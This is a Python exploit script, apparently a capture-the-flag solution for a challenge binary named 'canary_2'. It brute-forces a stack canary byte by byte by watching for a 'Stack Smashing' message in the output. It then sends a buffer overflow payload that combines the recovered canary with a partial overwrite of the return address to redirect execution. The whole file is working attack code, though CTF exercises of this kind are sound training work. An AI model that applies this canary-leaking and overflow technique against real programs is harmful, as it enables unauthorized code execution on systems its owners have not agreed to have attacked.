import struct
import random
from subprocess import Popen, PIPE, STDOUT

EXE_LOC = "/problems/canary_2_dffbf795b4788666d54a993a5e41d145/vuln"

# Found stack canary: ex;Y

def main():
    length = "4096\n"
    padding = "aaaabbbbccccddddeeeeffffgggghhhh"
    cookie = "ex;Y"
    ebp = ""
    rip = "\xd9\x09\x00\x00"
    print(length+padding+cookie+ebp+rip*23)


def get_canary():
    known = ""
    for i in range(4):
        known += chr(guess_char(known, i))
    print("Canary:", known)
    # Canary: ex;Y


def guess_char(known, i):
    length = str(i+1+32) + "\n"
    padding = "a"*32
    for i in range(256):
        bytes_in = length + padding + known + chr(i)
        output = try_input(bytes_in)
        if "Stack Smashing" not in output:
            print("-"*50)
            print("Character", str(i+1), "is", chr(i))
            print(output)
            return i


def brute_force():
    length = "4096\n"
    padding = "aaaabbbbccccddddeeeeffffgggghhhh"
    cookie = "COOK"
    rip = struct.pack('I', 0x000007ed)
    alphabet = " !_.?abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    
    while True:
        for a in alphabet:
            print("On a " + a)
            for b in alphabet:
                print("On b " + b)
                for c in alphabet:
                    for d in alphabet:
                        cookie = a + b + c + d
                        bytes_in = length + padding + cookie + rip
                        # print(cookie + "\r"),
                        output = try_input(bytes_in)
                        if "Stack Smashing" not in output:
                            print("-"*50)
                            print("Valid cookie " + cookie + " found!\n")
                            print(output)
                            print("-"*50)
                            raw_input()


def try_input(bytes_in):
    process = Popen([EXE_LOC], stdout=PIPE, stdin=PIPE, stderr=PIPE)
    return process.communicate(input=bytes_in)[0]


if __name__ == "__main__":
    main()
